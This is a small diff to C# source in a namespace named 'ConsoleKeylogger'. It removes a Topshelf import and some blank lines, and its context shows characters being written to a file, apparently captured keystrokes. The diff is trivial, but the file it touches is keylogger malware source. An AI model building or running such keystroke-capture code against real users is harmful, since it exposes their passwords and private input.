@@ -3,7 +3,6 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading;
-using Topshelf;
 using System.Runtime.InteropServices;
 using System.IO;
 
@@ -56,8 +55,6 @@ namespace ConsoleKeylogger
                             sw.Write((char) i);
                         }
                     }
-
-
                 }
             }
         }
